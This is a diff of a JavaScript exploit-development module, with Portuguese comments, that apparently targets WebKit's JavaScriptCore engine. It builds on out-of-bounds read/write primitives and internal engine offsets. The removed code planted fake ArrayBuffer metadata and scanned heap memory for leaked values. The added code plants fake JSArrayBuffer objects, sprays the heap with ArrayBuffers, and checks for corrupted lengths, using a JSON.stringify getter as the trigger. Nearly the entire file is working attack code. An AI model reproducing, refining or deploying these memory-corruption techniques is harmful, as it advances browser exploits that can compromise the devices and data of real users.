@@ -1,6 +1,4 @@
-// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs (Mantendo a estrutura do último teste bem-sucedido em termos de logs)
-// Foco: Usar o getter para tentar uma leitura OOB com um TypedArray sobre o oob_array_buffer_real,
-// após plantar metadados sombra com tamanho gigante.
+// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex } from '../utils.mjs';
 import {
@@ -13,173 +11,187 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForFinalLengthRetypeAttempt";
+const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForAggressiveFakeObj";
 let getter_called_flag = false;
-let current_test_results = { success: false, message: "Teste não iniciado.", error: null, details: "", oob_reads: [] };
+let current_test_results = { success: false, message: "Teste não iniciado.", error: null, details: "" };
 
 const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
 const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
 
-const FAKE_AB_CONTENTS_OFFSET_IN_OOB_DATA = 0x200; // Offset seguro dentro de oob_ab para plantar metadados
-const FAKE_AB_HUGE_SIZE = new AdvancedInt64(0x7FFFFFF0, 0x0); // Quase 2GB
-// Para este teste, o data_pointer dos metadados sombra apontará para o início do oob_array_buffer_real.
-// Se oob_array_buffer_real for re-tipado com este tamanho e ponteiro, um TypedArray sobre ele
-// terá um data_pointer = &oob_array_buffer_real[0] e length = FAKE_AB_HUGE_SIZE/element_size.
-const FAKE_AB_DATA_POINTER = new AdvancedInt64(0x0, 0x0); // Aponta para o início do oob_ab_data
+// Metadados sombra (ArrayBufferContents falsos)
+const FAKE_CONTENTS_DATA_PTR = new AdvancedInt64(0x1, 0x0); // Para causar crash se lido
+const FAKE_CONTENTS_SIZE = new AdvancedInt64(0x7FFFFFF0, 0x0); // Tamanho gigante
+const OFFSET_FOR_FAKE_CONTENTS = 0x300; // Onde plantaremos os ArrayBufferContents falsos dentro do oob_ab
 
-class CheckpointForFinalAttempt {
+class CheckpointForAggroFakeObj {
     constructor(id) {
-        this.id_marker = `FinalAttemptCheckpoint-${id}`;
+        this.id_marker = `AggroFakeObjCheckpoint-${id}`;
     }
-
     get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
         getter_called_flag = true;
-        const FNAME_GETTER = "FinalLengthRetype_Getter";
-        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
-        current_test_results = { success: false, message: "Getter chamado, tentando re-tipagem final de length.", error: null, details: "", oob_reads: [] };
+        const FNAME_GETTER = "AggroFakeObj_Getter";
+        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO! Tentando Fake Object agressivo...`, "vuln", FNAME_GETTER);
+        current_test_results = { success: false, message: "Getter chamado.", error: null, details: "" };
         let details_log = [];
 
         try {
-            if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute || !JSC_OFFSETS.ArrayBufferContents) {
-                throw new Error("Primitivas OOB, oob_array_buffer_real ou Offsets não disponíveis.");
+            if (!oob_array_buffer_real || !oob_write_absolute || !JSC_OFFSETS.ArrayBuffer || !JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.JSCell) {
+                throw new Error("Dependências não disponíveis (OOB R/W, Offsets).");
             }
+            const arrayBufferStructureID_val = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID; // Ex: 2
 
-            // 1. Re-plantar os metadados sombra (tamanho gigante) DENTRO do getter.
-            //    Local: FAKE_AB_CONTENTS_OFFSET_IN_OOB_DATA
-            //    Estes são os ArrayBufferContents que queremos que o oob_array_buffer_real use.
-            logS3(`DENTRO DO GETTER: Re-plantando metadados sombra (size=${FAKE_AB_HUGE_SIZE.toString(true)}, data_ptr=${FAKE_AB_DATA_POINTER.toString(true)}) em oob_data[${toHex(FAKE_AB_CONTENTS_OFFSET_IN_OOB_DATA)}]...`, "info", FNAME_GETTER);
-            oob_write_absolute(FAKE_AB_CONTENTS_OFFSET_IN_OOB_DATA + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, FAKE_AB_HUGE_SIZE, 8);
-            oob_write_absolute(FAKE_AB_CONTENTS_OFFSET_IN_OOB_DATA + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, FAKE_AB_DATA_POINTER, 8);
-            details_log.push(`Metadados sombra re-plantados em oob_data[${toHex(FAKE_AB_CONTENTS_OFFSET_IN_OOB_DATA)}].`);
+            // 1. Plantar os ArrayBufferContents falsos em um local conhecido do oob_array_buffer_real
+            oob_write_absolute(OFFSET_FOR_FAKE_CONTENTS + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, FAKE_CONTENTS_SIZE, 8);
+            oob_write_absolute(OFFSET_FOR_FAKE_CONTENTS + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, FAKE_CONTENTS_DATA_PTR, 8);
+            details_log.push(`Fake ArrayBufferContents plantados em oob_data[${toHex(OFFSET_FOR_FAKE_CONTENTS)}] (ptr=${FAKE_CONTENTS_DATA_PTR.toString(true)}, size=${FAKE_CONTENTS_SIZE.toString(true)})`);
 
-            // 2. Tentar corromper o m_impl (CONTENTS_IMPL_POINTER_OFFSET) do *próprio oob_array_buffer_real*
-            //    para apontar para os metadados sombra que acabamos de plantar.
-            //    Isso requer saber o endereço do objeto JS oob_array_buffer_real, o que não temos.
-            //    A escrita OOB em 0x70 é no *buffer de dados*.
-            //    Se 0x70 *fosse* o m_impl do objeto JS oob_array_buffer_real, teríamos sucesso.
-            //    Como os testes anteriores mostraram que oob_array_buffer_real.byteLength não muda,
-            //    a escrita em 0x70 provavelmente não está atingindo seu próprio m_impl.
-
-            //    Vamos prosseguir com a criação do Uint32Array sobre o oob_array_buffer_real,
-            //    esperando que a combinação da escrita em 0x70 (externa) E os metadados sombra
-            //    plantados no início do seu *próprio buffer* (interno) causem a re-tipagem.
-            logS3("DENTRO DO GETTER: Tentando 'new Uint32Array(oob_array_buffer_real)' para usar metadados sombra...", "info", FNAME_GETTER);
-            const large_reader = new Uint32Array(oob_array_buffer_real); // Usa o oob_array_buffer_real que teve seu conteúdo modificado
+            // 2. Tentar criar um "Fake JSArrayBuffer Object" em vários locais dentro do oob_array_buffer_real
+            //    e depois alocar ArrayBuffers reais na esperança de uma sobreposição.
+            const FAKE_JS_OBJECT_STRUCTURE_ID_FIELD = JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET; // Ou STRUCTURE_POINTER_OFFSET se estivermos escrevendo um ponteiro real
+            const FAKE_JS_OBJECT_IMPL_PTR_FIELD = JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET;
             
-            details_log.push(`Uint32Array criado. Length reportado: ${large_reader.length}. oob_ab.byteLength original: ${oob_array_buffer_real.byteLength}.`);
-            logS3(`DENTRO DO GETTER: large_reader.length: ${large_reader.length} (Esperado com re-tipagem: ${FAKE_AB_HUGE_SIZE.low() / 4})`, "info", FNAME_GETTER);
+            // O VALOR que queremos escrever no m_impl é o *offset dentro do oob_array_buffer_real*
+            // onde os FAKE_CONTENTS estão. Isso só funcionaria se o JSC tratasse esse offset
+            // como um ponteiro relativo à base do oob_array_buffer_real (improvável para m_impl).
+            // Uma abordagem mais correta seria escrever o endereço absoluto de 
+            // (oob_array_buffer_real_base_address + OFFSET_FOR_FAKE_CONTENTS), o que requer addrof.
+            // Para este teste, vamos escrever o offset relativo como um número.
+            const pointer_to_fake_contents_relative = new AdvancedInt64(OFFSET_FOR_FAKE_CONTENTS, 0);
 
-            if (large_reader.length * 4 === FAKE_AB_HUGE_SIZE.low() && FAKE_AB_HUGE_SIZE.low() > oob_array_buffer_real.byteLength) {
-                current_test_results.success = true;
-                current_test_results.message = `SUCESSO! oob_array_buffer_real RE-TIPADO para tamanho GIGANTE! Length do Uint32Array: ${large_reader.length}.`;
-                logS3(`DENTRO DO GETTER: ${current_test_results.message}`, "vuln", FNAME_GETTER);
-                details_log.push(current_test_results.message);
+            let sprayed_abs_victims = [];
+            const spray_attempts = 30; // Quantas vezes tentamos plantar o objeto falso e depois alocar
+            const num_abs_per_attempt = 5; // Quantos ABs alocar após cada tentativa de plantar o objeto falso
 
-                // Tentar ler um pouco além do limite original para confirmar OOB read no heap
-                const original_oob_ab_actual_len_u32 = oob_array_buffer_real.byteLength / 4;
-                const oob_read_idx_start = original_oob_ab_actual_len_u32 + 1; // Começa a ler logo após o fim original
-                const oob_read_idx_end = Math.min(large_reader.length, oob_read_idx_start + 256); // Ler até 256 dwords OOB
+            for (let attempt = 0; attempt < spray_attempts; attempt++) {
+                // Escolher um offset para plantar o Fake JSArrayBuffer Object dentro do oob_array_buffer_real
+                // Este offset precisa ser grande o suficiente para não sobrescrever o início (0x70) ou os fake_contents (0x300)
+                let offset_fake_jsobject = 0x400 + (attempt * 0x20); // Espalhar as tentativas
+                if (offset_fake_jsobject + 0x20 > oob_array_buffer_real.byteLength) break; // Evitar OOB no próprio oob_ab
 
-                logS3(`Varrendo com large_reader de índice ${oob_read_idx_start} até ${oob_read_idx_end -1}...`, "info", FNAME_GETTER);
-                for (let i = oob_read_idx_start; i < oob_read_idx_end; i++) {
+                details_log.push(`Tentativa ${attempt}: Plantando Fake JSArrayBuffer em oob_data[${toHex(offset_fake_jsobject)}] para apontar para FakeContents em oob_data[${toHex(OFFSET_FOR_FAKE_CONTENTS)}]`);
+                
+                // Escrever StructureID (ou ponteiro)
+                // NOTA: Escrever apenas o ID (ex: 2) onde um ponteiro de Structure é esperado é geralmente incorreto.
+                //       Mas é a melhor tentativa sem um ponteiro de Structure válido e conhecido.
+                oob_write_absolute(offset_fake_jsobject + FAKE_JS_OBJECT_STRUCTURE_ID_FIELD, arrayBufferStructureID_val, 4); // Escreve o ID como u32
+                
+                // Escrever o ponteiro para os Fake ArrayBufferContents
+                oob_write_absolute(offset_fake_jsobject + FAKE_JS_OBJECT_IMPL_PTR_FIELD, pointer_to_fake_contents_relative, 8);
+
+                // Alocar alguns ArrayBuffers reais. A esperança é que um deles seja alocado
+                // sobre a estrutura Fake JSArrayBuffer que acabamos de escrever.
+                let current_spray_batch = [];
+                for (let j = 0; j < num_abs_per_attempt; j++) {
                     try {
-                        const val = large_reader[i];
-                        if (val !== 0 && val !== undefined) { // Logar apenas valores não-zero/definidos
-                            let leak_info = `Leitura OOB: large_reader[${i}] (${toHex(i*4)}) = ${toHex(val)}`;
-                            logS3(leak_info, "leak", FNAME_GETTER);
-                            current_test_results.oob_reads.push(leak_info);
-                        }
-                    } catch (e_scan) { 
-                        details_log.push(`Erro na leitura OOB em índice ${i}: ${e_scan.message}`);
-                        logS3(`Erro na leitura OOB em large_reader[${i}]: ${e_scan.message}`, "error", FNAME_GETTER);
-                        // Parar de ler se um erro ocorrer, pois pode ser um crash real
+                        current_spray_batch.push(new ArrayBuffer(64));
+                    } catch (e_alloc_spray) { /* ignorar */ }
+                }
+                sprayed_abs_victims.push(...current_spray_batch);
+            }
+            details_log.push(`Total de ${sprayed_abs_victims.length} ArrayBuffers vítimas pulverizados após tentativas de plantar Fake JSObject.`);
+
+            // 3. Verificar todos os ArrayBuffers pulverizados
+            let corruption_successful = false;
+            for (let i = 0; i < sprayed_abs_victims.length; i++) {
+                const victim = sprayed_abs_victims[i];
+                if (!victim) continue;
+                let current_victim_len = -1;
+                try {
+                    current_victim_len = victim.byteLength;
+                    if (i < 10 || current_victim_len !== 64) { // Logar os primeiros e qualquer um com tamanho diferente
+                        details_log.push(`Verificando sprayed_abs_victims[${i}].byteLength: ${current_victim_len}`);
+                    }
+
+                    if (current_victim_len === FAKE_CONTENTS_SIZE.low()) {
+                        logS3(`DENTRO DO GETTER: SUCESSO! sprayed_abs_victims[${i}].byteLength (${current_victim_len}) CORRESPONDE ao tamanho sombra!`, "vuln", FNAME_GETTER);
+                        const dv = new DataView(victim);
+                        dv.getUint32(0, true); // Tenta ler de FAKE_CONTENTS_DATA_PTR (0x1) - ESPERA-SE CRASH/ERRO
+                        current_test_results = { success: true, message: `sprayed_abs_victims[${i}] RE-TIPADO (size OK)! Leitura de ${FAKE_CONTENTS_DATA_PTR.toString(true)} NÃO CRASHOU.`, error: null, details: details_log.join('; ') };
+                        corruption_successful = true;
+                        break; 
+                    }
+                } catch (e_check) {
+                    details_log.push(`Erro/Crash ao usar sprayed_abs_victims[${i}] (len antes do erro: ${current_victim_len}): ${e_check.message}`);
+                    logS3(`DENTRO DO GETTER: Erro/Crash com sprayed_abs_victims[${i}] (len: ${current_victim_len}): ${e_check.message}`, "error", FNAME_GETTER);
+                    if (current_victim_len === FAKE_CONTENTS_SIZE.low() &&
+                        (String(e_check.message).toLowerCase().includes("rangeerror") || String(e_check.message).toLowerCase().includes("memory access"))) {
+                        current_test_results = { success: true, message: `sprayed_abs_victims[${i}] RE-TIPADO (size OK) e CRASH CONTROLADO ('${e_check.message}') ao ler de ${FAKE_CONTENTS_DATA_PTR.toString(true)}!`, error: String(e_check), details: details_log.join('; ') };
+                        corruption_successful = true;
+                        logS3(`DENTRO DO GETTER: ${current_test_results.message}`, "vuln", FNAME_GETTER);
                         break;
                     }
                 }
-                if (current_test_results.oob_reads.length > 0) {
-                    details_log.push(`${current_test_results.oob_reads.length} leituras OOB realizadas.`);
-                } else {
-                    details_log.push("Nenhum dado OOB lido (ou todos eram zero).");
-                }
-
-            } else {
-                current_test_results.message = `Falha na re-tipagem de length. Length do Uint32Array: ${large_reader.length}, esperado (sombra): ${FAKE_AB_HUGE_SIZE.low() / 4}.`;
-                logS3(`DENTRO DO GETTER: ${current_test_results.message}`, "warn", FNAME_GETTER);
             }
+
+            if (!corruption_successful) {
+                current_test_results.message = "Nenhuma corrupção bem-sucedida nos ArrayBuffers pulverizados para usar o Fake JSObject / Fake Contents.";
+            }
+            current_test_results.details = details_log.join('; ');
 
         } catch (e) {
             logS3(`DENTRO DO GETTER: ERRO GERAL: ${e.message}`, "error", FNAME_GETTER);
             current_test_results.error = String(e);
             current_test_results.message = `Erro geral no getter: ${e.message}`;
         }
-        current_test_results.details = details_log.join('; ');
         return 0xBADF00D;
     }
 
     toJSON() {
-        const FNAME_toJSON = "CheckpointForFinalAttempt.toJSON";
+        const FNAME_toJSON = "CheckpointForAggroFakeObj.toJSON";
         logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
-        // eslint-disable-next-line no-unused-vars
         const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
-        return { id: this.id_marker, processed_by_final_retype_test: true };
+        return { id: this.id_marker, processed_by_aggro_fakeobj_test: true };
     }
 }
 
-export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
-    const FNAME_TEST = "executeFinalLengthRetypeAttempt"; // Nome interno
-    logS3(`--- Iniciando Tentativa Final de Re-Tipagem de Length no Getter ---`, "test", FNAME_TEST);
+export async function executeRetypeOOB_AB_Test() {
+    const FNAME_TEST = "executeAggressiveFakeObjectTest";
+    logS3(`--- Iniciando Teste Agressivo de Fake Object no Getter ---`, "test", FNAME_TEST);
 
     getter_called_flag = false;
-    current_test_results = { success: false, message: "Teste não executado.", error: null, details: "", oob_reads: [] };
+    current_test_results = { success: false, message: "Teste não executado.", error: null, details: "" };
 
-    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID) {
-        /* ... validação ... */ return;
+    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID || !JSC_OFFSETS.JSCell) {
+        logS3("Offsets JSC críticos ausentes.", "critical", FNAME_TEST);
+        return;
     }
 
     try {
         await triggerOOB_primitive();
-        if (!oob_array_buffer_real || !oob_dataview_real) { /* ... erro ... */ return; }
+        if (!oob_array_buffer_real || !oob_dataview_real) { logS3("OOB Init falhou.", "critical", FNAME_TEST); return; }
         logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);
 
-        // 1. Plantar "Metadados Sombra" com tamanho GIGANTE no local FAKE_AB_CONTENTS_OFFSET_IN_OOB_DATA
-        //    Isso é feito ANTES da escrita gatilho.
-        logS3(`Plantando metadados sombra (size=${FAKE_AB_HUGE_SIZE.toString(true)}, data_ptr=${FAKE_AB_DATA_POINTER.toString(true)}) em oob_data[${toHex(FAKE_AB_CONTENTS_OFFSET_IN_OOB_DATA)}]...`, "info", FNAME_TEST);
-        oob_write_absolute(FAKE_AB_CONTENTS_OFFSET_IN_OOB_DATA + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, FAKE_AB_HUGE_SIZE, 8);
-        oob_write_absolute(FAKE_AB_CONTENTS_OFFSET_IN_OOB_DATA + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, FAKE_AB_DATA_POINTER, 8);
-        
-        // 2. Realizar a escrita OOB "gatilho"
         oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
-        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} do oob_data completada.`, "info", FNAME_TEST);
+        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST);
 
-        // 3. Criar o objeto Checkpoint e chamar JSON.stringify
-        const checkpoint_obj = new CheckpointForFinalAttempt(1);
-        logS3(`CheckpointForFinalAttempt objeto criado. ID: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST);
+        const checkpoint_obj = new CheckpointForAggroFakeObj(1);
+        logS3(`Checkpoint objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST);
         
         logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST);
         try {
             JSON.stringify(checkpoint_obj);
-        } catch (e) { /* ... erro ... */ }
+        } catch (e) { logS3(`Erro em JSON.stringify: ${e.message}`, "error", FNAME_TEST); }
 
-    } catch (mainError) { /* ... erro principal ... */ }
-    finally { /* ... limpeza ... */ }
+    } catch (mainError) {
+        logS3(`Erro principal no teste: ${mainError.message}`, "critical", FNAME_TEST);
+        console.error(mainError);
+    } finally {
+        logS3("Limpeza finalizada.", "info", "CleanupFinal");
+    }
 
     if (getter_called_flag) {
         if (current_test_results.success) {
-            logS3(`RESULTADO TENTATIVA FINAL RE-TIPAGEM: SUCESSO! ${current_test_results.message}`, "vuln", FNAME_TEST);
+            logS3(`RESULTADO TESTE FAKE OBJECT AGRESSIVO: SUCESSO! ${current_test_results.message}`, "vuln", FNAME_TEST);
         } else {
-            logS3(`RESULTADO TENTATIVA FINAL RE-TIPAGEM: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST);
+            logS3(`RESULTADO TESTE FAKE OBJECT AGRESSIVO: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST);
         }
-        logS3(`  Detalhes da tentativa: ${current_test_results.details}`, "info", FNAME_TEST);
-        if (current_test_results.oob_reads && current_test_results.oob_reads.length > 0) {
-            logS3("Dados Lidos OOB (se houver):", "leak", FNAME_TEST);
-            current_test_results.oob_reads.forEach(leak_info => {
-                logS3(`  ${leak_info}`, "leak", FNAME_TEST);
-            });
+        if (current_test_results.details) {
+             logS3(`  Detalhes da tentativa: ${current_test_results.details}`, "info", FNAME_TEST);
         }
     } else {
-        logS3("RESULTADO TENTATIVA FINAL RE-TIPAGEM: Getter NÃO foi chamado.", "error", FNAME_TEST);
+        logS3("RESULTADO TESTE FAKE OBJECT AGRESSIVO: Getter NÃO foi chamado.", "error", FNAME_TEST);
     }
 
     clearOOBEnvironment();
-    logS3(`--- Tentativa Final de Re-Tipagem de Length no Getter Concluída ---`, "test", FNAME_TEST);
+    logS3(`--- Teste Agressivo de Fake Object Concluído ---`, "test", FNAME_TEST);
 }
